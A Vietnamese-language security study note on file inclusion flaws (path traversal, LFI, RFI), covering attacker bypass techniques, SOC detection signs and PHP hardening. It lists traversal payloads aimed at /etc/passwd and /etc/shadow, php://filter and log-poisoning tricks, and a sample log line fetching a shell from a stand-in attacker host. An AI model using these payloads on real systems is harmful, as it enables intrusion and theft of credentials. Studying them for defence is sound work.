# File Inclusion: Path Traversal, LFI & RFI

## 1. Concept

Lỗ hổng **File Inclusion** xảy ra khi một ứng dụng web cho phép người dùng kiểm soát các tham số dùng để nạp tệp tin (files) trên máy chủ.

* **ELI5:** Hãy tưởng tượng Server là một đầu bếp nấu ăn theo công thức (files).
  * **Path Traversal:** Bạn lừa đầu bếp mở cuốn sổ lương của nhà hàng thay vì cuốn sổ công thức.
  * **Local File Inclusion (LFI):** Bạn lừa đầu bếp lấy một "nguyên liệu lạ" có sẵn trong bếp (như file Log chứa mã độc) để nấu.
  * **Remote File Inclusion (RFI):** Bạn mang một nguyên liệu độc từ bên ngoài vào và bắt đầu bếp phải nấu nó.
* **Hậu quả:** Rò rỉ thông tin nhạy cảm (/etc/passwd, mã nguồn) hoặc tệ hơn là **RCE (Remote Code Execution)** - chiếm toàn quyền điều khiển máy chủ.

## 2. Key Mechanism

Cơ chế cốt lõi nằm ở việc **Thiếu xác thực đầu vào (Input Validation)** khi sử dụng các hàm nạp tệp (như `include()`, `require()` trong PHP).

1. **Concatenation (Ghép chuỗi):** Lập trình viên ghép dữ liệu người dùng nhập trực tiếp vào đường dẫn: `$file = "languages/" . $_GET['lang'] . ".php";`
2. **Path Traversal Sequence `(../)`:** Hệ điều hành hiểu `../` là "đi ngược lại một thư mục". Hacker dùng chuỗi này để thoát khỏi thư mục ứng dụng và truy cập thư mục gốc /.
3. **LFI vs Path Traversal:**
   * **Path Traversal** chỉ đọc nội dung file (Read-only).
   * **LFI** thực thi mã code bên trong file đó (Execute). Nếu file chứa mã PHP, server sẽ chạy nó.
4. **RFI:** Xảy ra khi server được cấu hình cho phép nạp file từ URL bên ngoài (`allow_url_include = On`). Server sẽ chủ động thực hiện một kết nối **Outbound** để tải mã độc của hacker về.

## 3. Security Perspective

### 🔴 Attacker View (Red Team)

Hacker sử dụng nhiều kỹ thuật bypass để vượt qua các bộ lọc cơ bản:

* **Bypass Extensions:** Dùng **Null Byte (%00)** (trong PHP cũ) để cắt bỏ đuôi .php bị áp đặt tự động.
* **Bypass Filtering:**
  * Nếu web xóa `../`, hacker dùng `....//` (khi xóa `../` ở giữa, hai phần còn lại sẽ chập lại thành `../`).
  * Sử dụng **PHP Wrappers** như `php://filter/convert.base64-encode/resource=config.php` để đọc mã nguồn dưới dạng Base64 (tránh việc server thực thi file nhạy cảm).
* **Log Poisoning (RCE):** Gửi mã độc vào trường `User-Agent` để nó ghi vào file `access.log`, sau đó dùng LFI để nạp file log đó -> Server thực thi mã độc.

### 🔵 Defender View (Blue Team/SOC)

Đây là lỗ hổng để lại dấu vết rất rõ ràng trong Log nếu hacker không xóa dấu vết.

* **Dấu hiệu nhận biết (SOC Alert):**
  * **Directory Traversal Patterns:** Xuất hiện chuỗi `../`, `..\`, `%2e%2e%2f` trong URL hoặc Request Body.
  * **Sensitive File Access:** Truy cập vào các đường dẫn "nhạy cảm" như `/etc/passwd`, `/windows/win.ini`, `apache2/access.log`, `.env`.
  * **Inbound URL in Params:** Tham số chứa giao thức `http://`, `https://`, `ftp://` (Dấu hiệu RFI).
  * **Unusual Outbound Connection:** Máy chủ Web bỗng dưng kết nối ra một IP lạ bên ngoài qua cổng 80/443 (Dấu hiệu RFI thành công).
* **Giả lập dòng Log điển hình (Apache Access Log):**

```
# Dấu hiệu tấn công Path Traversal để đọc file passwd
192.168.1.100 - - [20/May/2024:15:30:01] "GET /view.php?page=../../../../etc/passwd HTTP/1.1" 200 1240

# Dấu hiệu RFI - Nạp mã độc từ server bên ngoài
192.168.1.100 - - [20/May/2024:15:35:10] "GET /index.php?lang=http://hacker.com/shell.txt HTTP/1.1" 200 5000

# Dấu hiệu Bypass bằng Null Byte và lồng chuỗi
192.168.1.100 - - [20/May/2024:15:40:05] "GET /show.php?file=....//....//config.php%00 HTTP/1.1" 200 800
```

## 4. Useful Commands

### 🛠️ Common Payloads (LFI/Path Traversal)

```
# Linux
../../../../etc/passwd
../../../../etc/shadow
../../../../var/log/apache2/access.log

# Windows
../../../../windows/win.ini
../../../../boot.ini
../../../../Users/Administrator/Desktop/flag.txt

# PHP Wrapper (Đọc mã nguồn không bị thực thi)
php://filter/convert.base64-encode/resource=index.php
```

### 🔒 Remediation & Hardening (Phòng thủ)

Để triệt tiêu File Inclusion, SOC Analyst cần đề xuất các cấu hình sau:

#### **1. Cấu hình PHP (php.ini):**

```ini
# Chống RFI
allow_url_fopen = Off
allow_url_include = Off

# Chống rò rỉ thông tin
display_errors = Off
log_errors = On
```

#### **2. Coding Best Practice (Whitelist):**

```php
// Thay vì dùng include($_GET['page']), hãy dùng Whitelist
$allowed_pages = ['home', 'contact', 'about'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("pages/" . $page . ".php");
} else {
    echo "Access Denied!";
}
```

#### **3. Filesystem Permissions:**

* Chạy Web Server với người dùng có quyền hạn thấp (vd: www-data).
* Sử dụng chroot jail để cô lập ứng dụng web khỏi hệ điều hành gốc.
